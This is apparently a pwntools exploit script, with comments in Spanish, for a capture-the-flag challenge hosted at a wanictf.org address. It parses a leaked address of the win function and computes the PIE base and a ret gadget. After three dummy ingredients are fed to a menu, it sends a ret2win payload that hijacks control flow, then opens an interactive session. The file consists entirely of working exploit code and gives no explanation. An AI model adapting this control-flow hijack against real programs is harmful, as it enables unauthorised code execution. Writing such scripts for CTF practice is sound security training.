from pwn import *

gs = '''
b *main+491
continue
'''

elf = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("chal-lz56g6.wanictf.org", 9004)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

# Leak de la direccion de memoria de la funcion objetivo para ret2win
io.recvuntil(" = ")
win_address = int(io.recvline().strip(), 16)
print(f"[+] Win Address: {hex(win_address)}")

#pie = win_address - elf.symbols["show_flag"]
pie = win_address - elf.symbols["show_flag"]
elf.address = win_address - elf.symbols["show_flag"]

ret_gadget = pie + 0x101a
print(f"[+] Ret: {hex(ret_gadget)}")

# Primer Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")

# Segundo Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")

# Tercer Ingrediente
io.sendlineafter(": ", b"test") # name ingredient
io.sendlineafter(": ", b"1") # calories per gram
io.sendlineafter(": ", b"1")


payload = b"".join([
    p64(ret_gadget),
    p64(win_address)
])

io.sendlineafter(": ", payload)
io.sendlineafter(": ", b".")
io.sendlineafter(": ", b".")

io.interactive()
